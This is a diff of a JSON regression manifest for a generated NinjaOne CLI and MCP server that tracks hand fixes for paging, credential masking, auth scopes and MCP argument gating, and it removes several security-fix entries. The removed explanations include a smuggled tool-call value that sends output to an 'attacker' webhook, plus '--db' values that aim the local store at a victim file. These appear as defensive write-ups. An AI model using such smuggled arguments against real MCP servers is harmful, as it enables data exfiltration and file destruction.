@@ -32,8 +32,33 @@
     },
     {
      "file": "cli/internal/cli/sync.go",
-     "contains": "cursorParam = afterIDParam",
-     "min_count": 2
+     "contains": "seedDefaults.cursorParam = syncKeysetParam(path)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "syncKeysetLastID(path, items)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "(nextCursorProgress.hasOffset && ",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_sync_paging_test.go",
+     "contains": "func TestNinjaSyncWalksBareArrayListsByAfterID(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_sync_paging_test.go",
+     "contains": "func TestNinjaSyncWalksObjectCursorReportsToTheEnd(",
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/cli/sync_after_id_test.go",
@@ -179,41 +204,20 @@
     },
     {
      "file": "cli/internal/mcp/code_orch.go",
-     "contains": "neturl.PathEscape(formatMCPParamValue(v))",
-     "min_count": 1
+     "contains": "path = strings.ReplaceAll(path, placeholder, mcpPathValue(v))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "path = codeOrchApplyPathParams(path, params, ep.Positional, ep.TemplateParams)",
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/mcp/code_orch_path_test.go",
      "contains": "func TestCodeOrchExecuteSubstitutesStringPathParams",
      "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "env-oauth-secrets-not-persisted",
-   "summary": "SaveTokens keeps the env-override marker on ClientID/ClientSecret, so env-supplied OAuth credentials are never written to config.toml (issue #266)",
-   "why": "Load() marks ClientID/ClientSecret as env overrides and configForSave() restores the file value for any field still marked -- the mechanism that keeps env-supplied secrets off disk. SaveTokens() cleared both markers on every save, so each token mint (an ordinary authenticated command, no `auth login` step needed) rewrote the live client_id and client_secret into ~/.config/<tool>-cli/config.toml in cleartext, defeating Keychain/Credential-Manager setups that inject the secret as an env var at process launch. SaveTokens now leaves those two markers alone; only MarkCredentialsExplicit clears them, and only `auth login` calls it, passing whether each value came from a flag rather than from the env fallback. Provenance must be declared, not inferred: comparing the incoming value against the loaded one cannot tell an explicit flag from the env value it duplicates, and `auth login` trims its env fallback while Load does not, so a padded variable compares unequal to itself and leaks. Reported by @Xenith-B against halopsa-cli/ninjaone-cli. GENERATOR-class defect (the press emits the unconditional deletes) tracked for an upstream retro; until the press is fixed, a reprint reintroduces the leak and these markers guard the connector. Bug-fix-only: no new flag, command, or output.",
-   "status": "active",
-   "spec_encode_followup": "DONE UPSTREAM: mvanhorn/cli-printing-press#4393 merged 2026-08-28 (closed #4283 as completed), first shipped press v4.31.2; this hand-fix stays active until a reprint absorbs it; do NOT cite #4283 as open. Encoded there: SaveTokens must not clear the ClientID/ClientSecret env-override markers. Only a credential the caller supplied through an explicit command-line flag may clear them, and the flag's provenance must be passed in by the caller -- NOT inferred by comparing the incoming value against the loaded one. An explicit flag whose value equals the environment's is still explicit and must persist; conversely `auth login` trims its env fallback while Load does not, so a padded variable compares unequal to itself and a value-based rule leaks it.",
-   "asserts": [
-    {
-     "file": "cli/internal/config/config.go",
-     "contains": "func (c *Config) MarkCredentialsExplicit(clientID, clientSecret bool) {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/auth.go",
-     "contains": "cfg.MarkCredentialsExplicit(explicitClientID, explicitClientSecret)",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/config/config.go",
-     "contains": "markers now survive a save; only MarkCredentialsExplicit clears them.",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/config/config.go",
-     "not_contains": "delete(c.envOverrides, \"ClientID\")\n\tdelete(c.envOverrides, \"ClientSecret\")\n\tdelete(c.envOverrides, \"AccessToken\")"
     }
    ]
   },
@@ -269,7 +273,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -291,6 +295,30 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -379,55 +407,6 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
    "id": "no-config-write-switch",
    "summary": "NINJAONE_NO_CONFIG_WRITE makes every credential write a no-op (token cache included) while leaving the `auth logout` erase working, and the MCP server honours it too (issue #270)",
    "why": "Issue #270, raised by @Xenith-B off the back of #266. #266 stopped env-supplied client credentials reaching disk; the MINTED access token still landed in ~/.config/<tool>-cli/config.toml in cleartext and there was no supported way to turn that off. Their workaround was `--config NUL`, which is OS-specific, undocumented, makes doctor report a false 'not configured', and - the part that matters most - does not cover the MCP servers at all, because internal/mcp resolved its own hardcoded config path and ignored --config. Three deliberate boundaries make this switch honest rather than merely quiet. (1) ClearTokens keeps calling save() directly: it is the ERASE path, and routing it through the guard would make `auth logout` silently inert, which is a worse defect than the one being fixed. (2) `auth login` and `auth set-token` REFUSE and name the variable rather than reporting a save that did not happen - a false success is the same defect class as a doctor that says credentials are fine without checking. (3) newMCPClient now resolves through config.Load(\"\"), the resolver the CLI uses, so the MCP server honours both NINJAONE_CONFIG and this switch; that is the half the issue says is uncovered today. The variable is declared on all three install channels because for a Claude Desktop install the manifest prompt is the ONLY channel that can set an environment variable. Class C, new documented surface. GENERATOR-class: a reprint drops the switch entirely and silently restores the plaintext token cache.",
@@ -485,11 +464,6 @@
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/mcp_config_resolution_test.go",
-     "contains": "func TestMCPClientHonoursTheConfigEnvVar(",
-     "min_count": 1
-    },
-    {
      "file": "cli/internal/cli/auth.go",
      "contains": "if config.NoConfigWrite() {",
      "min_count": 2
@@ -503,52 +477,22 @@
      "file": "guide.md",
      "contains": "| `auth login` / `auth set-token` | Refuse, naming the variable, instead of reporting a save that did not happen. |",
      "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
+    },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
+     "file": "cli/internal/config/config.go",
+     "contains": "return c.saveCredentialMaterial()",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
+     "file": "cli/internal/config/config.go",
+     "contains": "func NoConfigWrite() bool {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
+     "file": "cli/internal/cli/auth.go",
+     "contains": "if config.NoConfigWrite() {",
      "min_count": 1,
      "code_only": true
     }
@@ -601,7 +545,7 @@
    "spec_encode_followup": "Press-side: emit the `create` alias only for operations that create something.",
    "asserts": [
     {
-     "file": "cli/internal/cli/alert_reset_alert-set-activity-data.go",
+     "file": "cli/internal/cli/alert_item_reset_alert-set-activity-data.go",
      "not_contains": "[]string{\"create\"}"
     },
     {
@@ -629,7 +573,7 @@
      "not_contains": "[]string{\"create\"}"
     },
     {
-     "file": "cli/internal/cli/document-templates_archive_document-template.go",
+     "file": "cli/internal/cli/document-templates_item_archive_document-template.go",
      "not_contains": "[]string{\"create\"}"
     },
     {
@@ -649,125 +593,6 @@
    ]
   },
   {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say HTTP mode is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "### Does this work with ChatGPT?\n\nNot with this build.",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "\"a\": \"Not with this build.",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path) (plus 1 more, see why)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path); the in-process endpoint handler (code orchestration execute) refuses a binary multipart field by name instead of opening the local path it names and uploading the file to the vendor. The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/tools.go",
-     "contains": "return mcplib.NewToolResultError(fmt.Sprintf(\"refusing %q: it names a file on the machine running the MCP server",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/tools.go",
-     "not_contains": "multipartFileFields[binding.WireName] = fmt.Sprintf(\"%v\", v)"
-    }
-   ]
-  },
-  {
    "id": "dry-run-never-mints",
    "class": "write-safety",
    "summary": "--dry-run never mints a token or changes stored credentials: neither the client's automatic client-credentials mint nor `auth login --dry-run` sends the client secret to the token URL, and `auth set-token --dry-run` and `auth logout --dry-run` neither save nor clear anything",
@@ -775,12 +600,6 @@
    "status": "active",
    "spec_encode_followup": "Press fix: client.go.tmpl should skip the client-credentials mint when DryRun is set (the dry-run preview already uses cached material only), and auth.go.tmpl's login should honor the root --dry-run flag.",
    "asserts": [
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "if !c.DryRun && needsClientCredentialsMint(c.Config) {",
-     "min_count": 1,
-     "code_only": true
-    },
     {
      "file": "cli/internal/cli/auth.go",
      "contains": "(dry run - no request sent, nothing saved)",
@@ -907,19 +726,7 @@
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
      "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
      "min_count": 1,
      "code_only": true
     },
@@ -929,7 +736,7 @@
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "cliutil.SanitizeErrorBody(c.shownErrorBody(body, clientID, clientSecret))",
+     "contains": "cliutil.SanitizeErrorBody(c.shownTokenErrorBody(body, clientID, clientSecret))",
      "min_count": 1,
      "code_only": true
     },
@@ -1038,8 +845,781 @@
     {
      "file": "cli/internal/cli/helpers.go",
      "not_contains": "\"error\": err.Error(),"
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return cliutil.FunnelWithhold(finishCredentialMask(masked, secrets), held)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "bodyText := c.shownErrorBody(respBody, authHeader)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "bodyText := truncateBody(respBody)"
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "c.shownSummary(respBody, summary, authHeader)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func (c *Client) shownSummary(body []byte, summary string, extraCredentials ...string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/jobs.go",
+     "contains": "funnelShownError(err),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/jobs.go",
+     "not_contains": "\"error\": err.Error(),"
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "c.holdCredentials()",
+     "min_count": 2,
+     "code_only": true
     }
    ]
+  },
+  {
+   "id": "ninja-paging-every-reader",
+   "class": "pagination",
+   "status": "active",
+   "summary": "Every reader follows NinjaOne's two paging shapes to the end, not only sync: bare-array lists keyed by the last item id (?after=) and /v2/queries/* reports with an object cursor. extractResourcePage wraps the rendered reader with the keyset and short-page rules (shared leaf package internal/ninjapage); the object cursor's offset rides in the internal cursor and only the token is sent; paged exports skip the response cache; the MCP bound pager takes its page size from the request and computes the keyset next cursor; MCP report pages read the object cursor.",
+   "why": "Press 4.34.0 stops a full bare-array page as incomplete but never advances, so export devices stopped at page one and reported done, export queries and MCP report pages read the object cursor as absent, and MCP bare-array pages reported count = page size with no next_cursor.",
+   "spec_encode_followup": "Teach the press keyset (after-id) and object-cursor pagination; until then this survives every reprint.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/resource_paths.go",
+     "contains": "func extractResourcePageRendered(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/resource_paths.go",
+     "contains": "return resourceObjectCursor(raw)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/resource_paths.go",
+     "contains": "resourceCursorWireValue(cursor)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/resource_paths.go",
+     "contains": "func resourceReadConfigForRendered(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/bound/bound.go",
+     "contains": "keysetNextCursor(items, opts)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/bound/bound.go",
+     "contains": "pageCursorAtPath(data, opts.NextCursorPath)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "codeOrchEffectivePageSize(path, query)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "if noCache || resourceReadConfigFor(resource).paginationType != \"\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "ninjaPaginatedGet(ctx, c, path, params",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/tail.go",
+     "contains": "func fetchAndEmitRendered(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/ninjapage/ninjapage.go",
+     "contains": "package ninjapage",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_export_paging_test.go",
+     "contains": "func Test",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/bound/ninja_paging_test.go",
+     "contains": "func Test",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-continuation-never-replays-a-stateful-cursor",
+   "class": "pagination",
+   "status": "active",
+   "summary": "An MCP continuation cursor for a report keeps the page it was issued for, scoped to the path and query, so a repeated call never replays NinjaOne's stateful report cursor into a different walk.",
+   "why": "A replayed report cursor returned the wrong page to an agent.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/bound/bound.go",
+     "contains": "RetainScope string",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/bound/bound.go",
+     "contains": "Retained string `json:\"r,omitempty\"`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/bound/bound.go",
+     "contains": "retainPageFor(state, opts, original)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/bound/bound.go",
+     "contains": "state.Retained = retain()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "bound.RetainedPage(mcpCursor, ninjaRetainScope(path, query))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "RetainScope:    ninjaRetainScope(path, query),",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "client-credentials-scopes-joined",
+   "class": "auth-wire",
+   "status": "active",
+   "summary": "The client-credentials token request resolves its scopes as a list (default control management monitoring, or NINJAONE_OAUTH_SCOPE split on whitespace) and joins them at form.Set(\"scope\"); the request on the wire is unchanged.",
+   "why": "Press 4.34.0 dogfood's OAuth scope check reads only this shape and failed every endpoint on the rendered single literal.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "func resolveClientCredentialsScopes() []string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "form.Set(\"scope\", strings.Join(scopes, \" \"))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func resolveClientCredentialsScopes() []string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "form.Set(\"scope\", strings.Join(scopes, \" \"))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/token_scope_test.go",
+     "contains": "func TestTokenMintRequestsTheConfiguredScopes(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "display-name",
+   "class": "docs",
+   "status": "active",
+   "summary": "Root help reads NinjaOne CLI and auth help reads Manage authentication for NinjaOne (the press renders Ninjaone).",
+   "why": "cli-printing-press#5226: the press title-cases the slug.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "Short: `NinjaOne CLI ",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "Short:       \"Manage authentication for NinjaOne\",",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "token-errors-funnelled-at-source",
+   "class": "secret-echo",
+   "status": "active",
+   "summary": "The token mint in auth.go and client.go returns its raw error to hand wrappers (ninja_token_errors.go) that funnel the token endpoint's error body with the client ID and secret it sent before any caller sees it.",
+   "why": "A token endpoint error body that echoed the client ID or secret reached callers that do not hold it.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "func mintClientCredentialsTokenRaw(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func (c *Client) mintClientCredentialsRaw(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "c.shownTokenErrorBody(body, clientID, clientSecret)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/funnel_error.go",
+     "contains": "func funnelShortEchoes(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "endpoint-reads-use-the-sync-partition",
+   "class": "local-store",
+   "status": "active",
